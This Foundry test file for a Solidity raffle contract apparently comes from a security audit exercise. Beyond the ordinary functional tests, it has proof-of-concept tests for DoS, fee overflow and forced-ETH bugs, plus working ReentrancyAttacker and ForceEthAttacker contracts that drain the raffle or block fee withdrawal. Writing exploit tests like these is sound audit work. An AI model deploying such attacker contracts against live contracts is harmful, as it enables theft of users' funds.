// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console, console2} from "lib/forge-std/src/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    event RaffleEnter(address[] newPlayers);

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string
            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    //////////////////////
    /// My Tests         ///
    /////////////////////

    function testIsEntryRaffleVulnToDOS() public {
        vm.txGasPrice(1);

        // First 100 users are entering
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);

        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console2.log("Gas Used for first 100 players: ", gasUsedFirst);

        // second 100 users are entering
        uint256 legitPlayersNum = 100;
        address[] memory legitPlayers = new address[](legitPlayersNum);

        for (uint256 i = 0; i < legitPlayersNum; i++) {
            legitPlayers[i] = address(i + playersNum + 1);
        }

        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * legitPlayersNum}(
            legitPlayers
        );
        uint256 gasEnd2 = gasleft();

        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;

        console2.log("Gas Used for second 100 players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

    function testReentrancyOnRefund() public {
        uint256 numOfPlayers = 5;
        address[] memory players = new address[](numOfPlayers);

        for (uint256 i = 0; i < numOfPlayers; i++) {
            players[i] = address(i);
        }

        puppyRaffle.enterRaffle{value: entranceFee * numOfPlayers}(players);

        uint256 raffleInitialBalance = address(puppyRaffle).balance;

        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(attacker), 1 ether);
        uint256 attackerInitialBalance = address(attacker).balance;

        attacker.attack();

        uint256 raffleFinalBalance = address(puppyRaffle).balance;
        uint256 attackerFinalBalance = address(attacker).balance;

        console2.log("raffleInitial Balance: ", raffleInitialBalance);
        console2.log("raffleFinal Balance: ", raffleFinalBalance);

        console2.log("attacker initial balance: ", attackerInitialBalance);
        console2.log("Attacker Final Balance: ", attackerFinalBalance);

        assertEq(raffleFinalBalance, 0);
        assertEq(
            raffleInitialBalance + attackerInitialBalance,
            attackerFinalBalance
        );
    }

    function testLossOfFeeDueToUnsafeCastingAndOverflow() public {
        uint256 myPlayersLength = 120;
        address[] memory myPlayers = new address[](myPlayersLength);

        for (uint256 i = 0; i < myPlayersLength; i++) {
            myPlayers[i] = address(i + 100);
        }

        puppyRaffle.enterRaffle{value: entranceFee * myPlayersLength}(
            myPlayers
        );

        vm.warp(block.timestamp + puppyRaffle.raffleDuration());

        puppyRaffle.selectWinner();

        uint256 correctFee = (entranceFee * myPlayersLength * 20) / 100;
        uint256 feeAfterOverFlow = correctFee % 2 ** 64; // formula to casting bigvalues to uint64
        console2.log("Correct Fee: ", correctFee);
        console2.log("Actual Fee: ", uint256(puppyRaffle.totalFees()));
        console2.log("Calculated fee after overflow: ", feeAfterOverFlow);
        assert(correctFee > puppyRaffle.totalFees());
        assertEq(feeAfterOverFlow, puppyRaffle.totalFees());
    }

    function testCanAttackerBlockFeesWithdrawalThroughSelfDestructAttack()
        public
    {
        uint256 playersNum = 10;
        address[] memory myPlayers = new address[](playersNum);

        for (uint i = 0; i < playersNum; i++) {
            myPlayers[i] = address(i + 1012);
        }

        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(myPlayers);

        vm.warp(block.timestamp + puppyRaffle.raffleDuration() + 100);

        puppyRaffle.selectWinner();

        uint256 initialRaffleBalance = address(puppyRaffle).balance;
        uint256 raffleFeeToWithdraw = puppyRaffle.totalFees();

        // Attacking raffle
        uint256 ethAmountToForce = 2 ether;
        ForceEthAttacker attackerContract = new ForceEthAttacker(
            address(puppyRaffle)
        );
        vm.deal(address(attackerContract), ethAmountToForce);
        attackerContract.destructMe();

        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;

        assertEq(initialRaffleBalance, raffleFeeToWithdraw); // initially (before owner can withdraw fee)
        assertEq(
            raffleBalanceAfterAttack,
            initialRaffleBalance + ethAmountToForce
        ); // after the balance will be increase by forcedAmount
        assert(raffleBalanceAfterAttack > raffleFeeToWithdraw); // so raffleBalance > totalFees and the owner can't withdraw fee forever

        vm.expectRevert("PuppyRaffle: There are currently players active!"); // even though there are no currently active players
        puppyRaffle.withdrawFees();
    }

    function testWillTransactionCrashIfEmptyPlayersIsSuppliedInEnterRaffle()
        public
    {
        address[] memory myPlayers = new address[](0);

        vm.expectRevert(); // OutOfGas
        puppyRaffle.enterRaffle{value: 0}(myPlayers);
    }

    function testWillEnterRaffleEmitEventEvenIfEmptyListIsSupplied() public {
        address[] memory myPlayers = new address[](1);

        myPlayers[0] = address(1 + 124);

        puppyRaffle.enterRaffle{value: entranceFee}(myPlayers);

        address[] memory emptyPlayers = new address[](0);

        vm.expectEmit();
        emit RaffleEnter(emptyPlayers);
        puppyRaffle.enterRaffle{value: 0}(emptyPlayers);
    }
}

contract ReentrancyAttacker {
    PuppyRaffle private puppyRaffle;
    uint256 private myIndex;
    uint256 private entranceFee;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        myIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(myIndex);
    }

    function _stealMoney() internal {
        if (
            msg.sender == address(puppyRaffle) &&
            address(puppyRaffle).balance >= 1
        ) {
            puppyRaffle.refund(myIndex);
        }
    }
}

contract ForceEthAttacker {
    address private puppyRaffleAddr;

    constructor(address _puppyRaffleAddr) {
        puppyRaffleAddr = _puppyRaffleAddr;
    }

    function destructMe() public {
        selfdestruct(payable(puppyRaffleAddr));
    }
}
